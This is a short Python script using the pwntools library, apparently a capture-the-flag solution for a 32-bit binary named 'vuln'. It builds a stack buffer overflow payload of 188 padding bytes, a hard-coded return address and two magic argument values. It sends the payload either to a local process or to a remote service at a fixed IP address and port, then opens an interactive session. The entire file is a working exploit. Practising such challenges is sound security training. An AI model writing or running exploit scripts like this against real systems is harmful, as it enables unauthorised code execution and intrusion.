#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./vuln')
context.log_level = "debug"

if args.REMOTE:
    p = remote('64.227.37.161', 31154)
else:
    p = process(binary.path)

#gdb.attach(p)

payload  = b""
payload += b"A"*188
payload += p32(0x80491e2)
payload += b"A"*4
payload += p32(0xdeadbeef)
payload += p32(0xc0ded00d)
print(payload)

p.sendline(payload)
p.stream()
p.interactive()